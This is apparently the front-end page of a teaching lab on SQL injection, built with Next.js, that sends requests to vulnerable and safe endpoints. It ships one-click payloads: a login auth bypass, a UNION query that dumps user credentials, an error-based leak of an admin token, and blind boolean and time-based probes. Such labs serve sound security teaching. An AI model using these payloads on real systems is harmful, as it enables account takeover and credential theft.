"use client";

import { useState } from "react";

const API = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:8080";

type Mode = "vuln" | "safe";

// Ready-made payloads students can load with one click.
const PAYLOADS = {
  login: [
    { label: "Normal login", username: "alice", password: "alice-pass-123" },
    { label: "Auth bypass", username: "' OR '1'='1' -- ", password: "anything" },
  ],
  products: [
    { label: "Normal search", q: "Mon" },
    { label: "UNION: dump credentials", q: "zzz' UNION SELECT id, username || ':' || password, 0 FROM users -- " },
    { label: "Error-based: leak admin token", q: "zzz' OR 1=json_extract('{}',(SELECT api_token FROM users WHERE role='admin')) -- " },
  ],
  user: [
    { label: "Normal lookup", id: "2" },
    { label: "Boolean blind probe", id: "3 AND (SELECT substr(password,1,1) FROM users WHERE id=3)='S'" },
    { label: "Time-based blind", id: "3 AND sleep(2)" },
  ],
};

function Result({ data }: { data: unknown }) {
  if (data === null) return null;
  return <pre className="result">{JSON.stringify(data, null, 2)}</pre>;
}

export default function Home() {
  const [mode, setMode] = useState<Mode>("vuln");
  const [login, setLogin] = useState({ username: "' OR '1'='1' -- ", password: "anything" });
  const [q, setQ] = useState(PAYLOADS.products[1].q);
  const [id, setId] = useState("2");
  const [res, setRes] = useState<Record<string, unknown>>({});

  const base = `${API}/${mode}`;
  async function run(key: string, p: Promise<Response>) {
    setRes((r) => ({ ...r, [key]: "running…" }));
    try {
      const data = await (await p).json();
      setRes((r) => ({ ...r, [key]: data }));
    } catch (e) {
      setRes((r) => ({ ...r, [key]: { error: String(e) } }));
    }
  }

  return (
    <main>
      <header>
        <div>
          <h1>SQL Injection Lab</h1>
          <p className="muted">Next.js → Hono + SQLite · for learning only</p>
        </div>
        <div className="toggle">
          <button className={mode === "vuln" ? "on vuln" : ""} onClick={() => setMode("vuln")}>Vulnerable</button>
          <button className={mode === "safe" ? "on safe" : ""} onClick={() => setMode("safe")}>Safe</button>
        </div>
      </header>

      <p className={`banner ${mode}`}>
        {mode === "vuln"
          ? "⚠ Hitting the VULNERABLE endpoints — queries are built by string concatenation."
          : "✓ Hitting the SAFE endpoints — parameterised queries + input validation."}
      </p>

      {/* AUTH BYPASS */}
      <section className="card">
        <h2>1 · Login <span className="path">POST /{mode}/login</span></h2>
        <div className="chips">
          {PAYLOADS.login.map((p) => (
            <button key={p.label} className="chip" onClick={() => setLogin({ username: p.username, password: p.password })}>{p.label}</button>
          ))}
        </div>
        <label>username<input value={login.username} onChange={(e) => setLogin({ ...login, username: e.target.value })} /></label>
        <label>password<input value={login.password} onChange={(e) => setLogin({ ...login, password: e.target.value })} /></label>
        <button className="go" onClick={() => run("login", fetch(`${base}/login`, {
          method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(login),
        }))}>Send</button>
        <Result data={res.login ?? null} />
      </section>

      {/* UNION / ERROR */}
      <section className="card">
        <h2>2 · Product search <span className="path">GET /{mode}/products?q=</span></h2>
        <div className="chips">
          {PAYLOADS.products.map((p) => (
            <button key={p.label} className="chip" onClick={() => setQ(p.q)}>{p.label}</button>
          ))}
        </div>
        <label>q<input value={q} onChange={(e) => setQ(e.target.value)} /></label>
        <button className="go" onClick={() => run("products", fetch(`${base}/products?q=${encodeURIComponent(q)}`))}>Send</button>
        <Result data={res.products ?? null} />
      </section>

      {/* BLIND */}
      <section className="card">
        <h2>3 · User lookup <span className="path">GET /{mode}/user?id=</span></h2>
        <div className="chips">
          {PAYLOADS.user.map((p) => (
            <button key={p.label} className="chip" onClick={() => setId(p.id)}>{p.label}</button>
          ))}
        </div>
        <label>id<input value={id} onChange={(e) => setId(e.target.value)} /></label>
        <button className="go" onClick={() => run("user", fetch(`${base}/user?id=${encodeURIComponent(id)}`))}>Send</button>
        <Result data={res.user ?? null} />
      </section>
    </main>
  );
}
